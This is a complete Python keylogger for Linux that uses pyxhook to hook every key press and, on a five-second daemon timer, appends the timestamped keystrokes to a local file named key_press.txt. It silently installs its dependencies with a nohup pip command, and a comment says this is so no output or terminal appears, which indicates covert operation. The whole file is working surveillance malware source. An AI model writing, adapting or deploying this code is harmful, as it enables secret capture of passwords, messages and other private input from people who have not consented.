import pyxhook
from datetime import datetime
import logging
from threading import Timer
import os

os.system("nohup pip install pyxhook datetime logging threading os >/dev/null 2>&1") # To install pyxhook automatically without it printing or opening a terminal

class Keylogger:
  '''
  This class creates an object for keylogging and contains the following methods:
  1. event_logger : to grab event key from pyxhook and storing it in logMessage
  2. log_keys : to save logged input into a file
  3. key_hook : to grab input of pressed down key and calling onto the methods within the class to store content
  '''
  def __init__(self):
    self.logMessage = ""
    self.time = datetime.now()

  def event_logger(self,event):
    inputlog = event.Key
    if len(inputlog) > 1:  # Checking if input is special input such as Enter, Space Bar, Back Space and etc.
      inputlog = f'[{inputlog}]' # Adding brackets to better differentiate in logs.
    self.logMessage += inputlog # Adding the key into logMessage variable

  def log_keys(self):
    logging.basicConfig(filename='key_press.txt', level=logging.INFO, filemode='a') # Stores content as a log using logging library
    logging.info(f'{datetime.now().replace(microsecond=0)}' + self.logMessage) # Appending date of the action at the beginning of the line following the keys pressed
    timer = Timer(interval=5, function=self.log_keys) # Creating a daemon and setting it as the interval
    timer.daemon = True
    timer.start()

  def key_hook(self):
    hook = pyxhook.HookManager()
    hook.KeyDown = self.event_logger # Calling onto event_logger to provide it with "event" variable
    hook.HookKeyboard() # Monitoring
    self.log_keys() # Initiating logging
    hook.start()

if __name__ == "__main__":
  logger = Keylogger()
  logger.key_hook()
